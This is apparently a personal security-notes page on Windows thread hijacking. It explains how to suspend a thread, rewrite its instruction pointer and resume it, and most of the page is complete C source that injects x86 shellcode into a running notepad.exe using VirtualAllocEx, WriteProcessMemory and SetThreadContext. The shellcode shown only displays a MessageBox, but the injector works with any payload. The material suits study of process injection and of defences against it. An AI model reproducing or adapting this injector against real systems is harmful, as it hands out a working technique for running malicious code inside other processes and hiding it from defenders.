<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Thread Hijacking</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Thread Hijacking</h1></strong><br />Thread hijacking is a means of executing your injected code within a process.<br /><br />The general premise is as follows:<br />• <code>OpenThread</code> - grab a handle to a thread in the target process<br />• <code>SuspendThread</code> - pause the execution of that thread<br />• <code>GetThreadContext</code> - retrieve the current register states for that thread and store in a CONTEXT struct<br />• Modify the registers in the CONTEXT struct so that on resume they will execute your injected code<br />• <code>SetThreadContext</code> - write the register modifications into the target thread<br />• <code>ResumeThread</code> - resume execution of the thread, and your injected could should execute<br /><br /><strong><h2>## Executing What?</h2></strong><br /><strong><h3>### Executing Shellcode</h3></strong><br />The IP register - Instruction Pointer - points to the next instruction to be executed.<br />If you&#39;re executing shellcode, you need to modify the IP register to point to the address of your injected shellcode.<br /><br /><div class="codebox"><div class="codebox">#ifdef&nbsp;_WIN64<br />	target_ctx.Rip&nbsp;=&nbsp;(DWORD_PTR)shellcode_addr;<br />#else<br />	target_ctx.Eip&nbsp;=&nbsp;(DWORD_PTR)shellcode_addr;<br />#endif</div></div><br /><br /><strong><h3>### Executing an Injected PE</h3></strong><br />If you&#39;re executing an injected PE file, your need to copy the PE&#39;s entry point into an architecture-specific register.<br />• for 32bit, the entry point is copied into EAX<br />• for 64bit, it goes in RCX<br /><br /><div class="codebox"><div class="codebox">#ifdef&nbsp;_WIN64<br />&nbsp;&nbsp;&nbsp;&nbsp;target_ctx.Rcx&nbsp;=&nbsp;(DWORD_PTR)base&nbsp;+&nbsp;pe_header-&gt;OptionalHeader.AddressOfEntryPoint;<br />#else<br />&nbsp;&nbsp;&nbsp;&nbsp;target_ctx.Eax&nbsp;=&nbsp;(DWORD_PTR)base&nbsp;+&nbsp;pe_header&nbsp;&gt;OptionalHeader.AddressOfEntryPoint;<br />#endif</div></div><br /><br />Examples<br />• My Process Hollowing Demo<br /><br /><strong><h2>## Create suspended process - CreateProcess with CREATE_SUSPENDED</h2></strong><br />Creating a new process is arguably a simpler method than suspending an existing one because creating a process will return you a handle to a thread.<br />This means you don&#39;t have go loop through all the threads on the system to find one owned by your target process (not complicated, just another step).<br /><br />Examples<br />• My Process Hollowing Demo<br /><br /><strong><h2>## Target existing process - SuspendThread</h2></strong><br />When targetting an existing process, you&#39;ll need to find a thread owned by your target process.<br />To do this, you&#39;ll need the PID (process ID) of your target process.<br />With that, you can loop through all the threads on the system and find a thread where its <code>OwnerProcessID</code> is that of your target process.<br /><br /><strong><h3>### Demo Code with x86 Shellcode</h3></strong><br />In this demo I&#39;m injecting some x86 &quot;Hello, world! MessageBox shellcode into a 32bit notepad.exe process.<br /><br />It&#39;s running on Windows 10 x64 2004 and compiled as a 32bit binary.<br />(I&#39;m doing 32bit because I couldn&#39;t find reliable 64bit code).<br />I&#39;ve started a 32bit Notepad process from <code>C:\Windows\SysWOW64\notepad.exe</code><br /><br /><a href=""><img src="images/1656-1.png" alt="images/1656-1.png" /></a><br /><br />If you&#39;re lost, start reading from the <code>FindProcessAndInject</code> function (which calls everything else).<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;TlHelp32.h&gt;<br /><br />//&nbsp;x86&nbsp;MessageBox&nbsp;shellcode<br />//&nbsp;https://www.exploit-db.com/exploits/37758<br />char&nbsp;shellcode[]&nbsp;=&nbsp;&quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b&quot;<br />&quot;\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09&quot;<br />&quot;\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d&quot;<br />&quot;\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03&quot;<br />&quot;\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81&quot;<br />&quot;\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04&quot;<br />&quot;\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03&quot;<br />&quot;\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3&quot;<br />&quot;\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68&quot;<br />&quot;\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68&quot;<br />&quot;\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9&quot;<br />&quot;\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65&quot;<br />&quot;\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01&quot;<br />&quot;\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68&quot;<br />&quot;\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68&quot;<br />&quot;\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68&quot;<br />&quot;\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57&quot;<br />&quot;\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c&quot;<br />&quot;\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78&quot;<br />&quot;\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;;<br /><br />/*<br />Returns&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;in&nbsp;target<br />*/<br />LPVOID&nbsp;WriteShellcodeIntoTarget(DWORD&nbsp;process_id)<br />{<br />	LPVOID&nbsp;shellcode_addr&nbsp;=&nbsp;NULL;<br /><br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	HANDLE&nbsp;h_target_process&nbsp;=&nbsp;NULL;<br /><br />	h_target_process&nbsp;=&nbsp;OpenProcess(PROCESS_ALL_ACCESS,&nbsp;FALSE,&nbsp;process_id);<br />	if&nbsp;(h_target_process&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;open&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		shellcode_addr&nbsp;=&nbsp;NULL;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;\t&nbsp;opened&nbsp;target&nbsp;process&nbsp;\n&quot;);<br /><br />	shellcode_addr&nbsp;=&nbsp;VirtualAllocEx(h_target_process,&nbsp;NULL,&nbsp;sizeof(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />	if&nbsp;(shellcode_addr&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		shellcode_addr&nbsp;=&nbsp;NULL;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;\t&nbsp;allocated&nbsp;memory&nbsp;in&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;shellcode_addr);<br /><br />	b_ret&nbsp;=&nbsp;WriteProcessMemory(h_target_process,&nbsp;shellcode_addr,&nbsp;shellcode,&nbsp;sizeof(shellcode),&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;write&nbsp;shellcode&nbsp;into&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		shellcode_addr&nbsp;=&nbsp;NULL;<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;\t&nbsp;wrote&nbsp;shellcode&nbsp;into&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;shellcode_addr);<br /><br />cleanup:<br />	if&nbsp;(h_target_process)&nbsp;CloseHandle(h_target_process);<br /><br />	return&nbsp;shellcode_addr;<br />}<br /><br />BOOL&nbsp;HijackThread(DWORD&nbsp;thread_id,&nbsp;LPVOID&nbsp;shellcode_addr)<br />{<br />	BOOL&nbsp;success&nbsp;=&nbsp;TRUE;<br /><br />	int&nbsp;i_ret&nbsp;=&nbsp;0;<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	HANDLE&nbsp;h_target_thread&nbsp;=&nbsp;NULL;<br />	CONTEXT&nbsp;target_ctx&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	target_ctx.ContextFlags&nbsp;=&nbsp;CONTEXT_FULL;<br /><br />	h_target_thread&nbsp;=&nbsp;OpenThread(THREAD_ALL_ACCESS,&nbsp;FALSE,&nbsp;thread_id);<br />	if&nbsp;(h_target_thread&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;open&nbsp;thread:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		success&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t&nbsp;opened&nbsp;thread&nbsp;\n&quot;);<br /><br />	i_ret&nbsp;=&nbsp;SuspendThread(h_target_thread);<br />	if&nbsp;(i_ret&nbsp;==&nbsp;(DWORD)-1)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;suspend&nbsp;thread:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		success&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t&nbsp;suspended&nbsp;thread&nbsp;\n&quot;);<br /><br />	b_ret&nbsp;=&nbsp;GetThreadContext(h_target_thread,&nbsp;&amp;target_ctx);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;get&nbsp;thread&nbsp;context:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		success&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t&nbsp;retrieved&nbsp;thread&nbsp;context&nbsp;\n&quot;);<br /><br />	//&nbsp;Write&nbsp;address&nbsp;of&nbsp;injected&nbsp;shellcode&nbsp;into&nbsp;IP&nbsp;-&nbsp;Instruction&nbsp;Pointer&nbsp;-&nbsp;register.<br />#ifdef&nbsp;_WIN64<br />	target_ctx.Rip&nbsp;=&nbsp;(DWORD_PTR)shellcode_addr;<br />#else<br />	target_ctx.Eip&nbsp;=&nbsp;(DWORD_PTR)shellcode_addr;<br />#endif<br /><br />	b_ret&nbsp;=&nbsp;SetThreadContext(h_target_thread,&nbsp;&amp;target_ctx);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;set&nbsp;thread&nbsp;context:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		success&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t&nbsp;set&nbsp;thread&nbsp;context&nbsp;-&nbsp;EAX&nbsp;now&nbsp;points&nbsp;to&nbsp;shellcode.&nbsp;EAX:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;shellcode_addr);<br /><br />	i_ret&nbsp;=&nbsp;ResumeThread(h_target_thread);<br />	if&nbsp;(i_ret&nbsp;==&nbsp;(DWORD)-1)<br />	{<br />		printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;resume&nbsp;thread:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		success&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br />	printf(&quot;\t&nbsp;resumed&nbsp;thread&nbsp;\n&quot;);<br /><br />cleanup:<br />	if&nbsp;(h_target_thread)&nbsp;CloseHandle(h_target_thread);<br /><br />	return&nbsp;success;<br />}<br /><br />/*<br />Finds&nbsp;the&nbsp;target&nbsp;process,&nbsp;writes&nbsp;shellcode&nbsp;into&nbsp;the&nbsp;target,&nbsp;finds&nbsp;a&nbsp;thread&nbsp;in&nbsp;the&nbsp;target,<br />and&nbsp;hijacks&nbsp;a&nbsp;thread&nbsp;to&nbsp;execute&nbsp;the&nbsp;injected&nbsp;shellcode.<br />*/<br />void&nbsp;FindProcessAndInject(wchar_t*&nbsp;target_process)<br />{<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	DWORD&nbsp;i_ret&nbsp;=&nbsp;0;<br /><br />	//wchar_t&nbsp;target_process[]&nbsp;=&nbsp;L&quot;notepad.exe&quot;;<br />	BOOL&nbsp;process_found&nbsp;=&nbsp;FALSE;<br /><br />	HANDLE&nbsp;h_snapshot&nbsp;=&nbsp;NULL;<br />	PROCESSENTRY32&nbsp;process&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	THREADENTRY32&nbsp;thread&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	process.dwSize&nbsp;=&nbsp;sizeof(PROCESSENTRY32);<br />	thread.dwSize&nbsp;=&nbsp;sizeof(THREADENTRY32);<br /><br />	LPVOID&nbsp;target_shellcode&nbsp;=&nbsp;NULL;<br /><br />	//&nbsp;STEP&nbsp;1.&nbsp;Find&nbsp;target&nbsp;process<br />	//&nbsp;-----------------------------------------------------<br />	//&nbsp;take&nbsp;snapshot&nbsp;of&nbsp;processes<br />	h_snapshot&nbsp;=&nbsp;CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS&nbsp;|&nbsp;TH32CS_SNAPTHREAD,&nbsp;0);<br />	Process32First(h_snapshot,&nbsp;&amp;process);<br /><br />	//&nbsp;loop&nbsp;until&nbsp;we&nbsp;find&nbsp;our&nbsp;target&nbsp;process<br />	do<br />	{<br />		if&nbsp;(wcscmp(process.szExeFile,&nbsp;target_process)&nbsp;==&nbsp;0)<br />		{<br />			process_found&nbsp;=&nbsp;TRUE;<br />			break;<br />		}<br />	}&nbsp;while&nbsp;(Process32Next(h_snapshot,&nbsp;&amp;process));<br /><br />	//&nbsp;if&nbsp;process&nbsp;found,&nbsp;write&nbsp;shellcode&nbsp;into&nbsp;target&nbsp;process<br />	if&nbsp;(process_found&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;find&nbsp;target&nbsp;process:&nbsp;%ws&nbsp;\n&quot;,&nbsp;target_process);<br />		return;<br />	}<br /><br />	//&nbsp;STEP&nbsp;2.&nbsp;Write&nbsp;shellcode&nbsp;into&nbsp;target&nbsp;process<br />	//&nbsp;-----------------------------------------------------<br />	printf(&quot;[+]&nbsp;found&nbsp;target&nbsp;process:&nbsp;%ws&nbsp;\n&quot;,&nbsp;target_process);<br />	target_shellcode&nbsp;=&nbsp;WriteShellcodeIntoTarget(process.th32ProcessID);<br />	if&nbsp;(target_shellcode&nbsp;==&nbsp;NULL)<br />		return;<br /><br />	//&nbsp;STEP&nbsp;3.&nbsp;Find&nbsp;thread&nbsp;in&nbsp;target&nbsp;process&nbsp;&amp;&nbsp;hijack<br />	//&nbsp;-----------------------------------------------------<br />	//&nbsp;loop&nbsp;through&nbsp;threads,&nbsp;grab&nbsp;first&nbsp;thread&nbsp;ID&nbsp;that&nbsp;belongs&nbsp;to&nbsp;target&nbsp;process,&nbsp;and&nbsp;hijack&nbsp;it<br />	printf(&quot;[+]&nbsp;looping&nbsp;through&nbsp;threads...&nbsp;\n&quot;);<br />	Thread32First(h_snapshot,&nbsp;&amp;thread);<br />	do<br />	{<br />		if&nbsp;(thread.th32OwnerProcessID&nbsp;==&nbsp;process.th32ProcessID)<br />		{<br />			printf(&quot;[+]&nbsp;found&nbsp;thread&nbsp;in&nbsp;target:&nbsp;0x%d&nbsp;\n&quot;,&nbsp;thread.th32ThreadID);<br />			b_ret&nbsp;=&nbsp;HijackThread(thread.th32ThreadID,&nbsp;target_shellcode);<br />			if&nbsp;(b_ret&nbsp;==&nbsp;TRUE)<br />			{<br />				break;<br />			}<br />			else<br />			{<br />				printf(&quot;\t&nbsp;trying&nbsp;next&nbsp;thread&nbsp;\n&quot;);<br />				continue;<br />			}<br />		}<br />	}&nbsp;while&nbsp;(Thread32Next(h_snapshot,&nbsp;&amp;thread));<br /><br />	return;<br />}<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	FindProcessAndInject(L&quot;notepad.exe&quot;);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><br /><br /><br /><br /><br /><br /><br /></div>
</body>
</html>
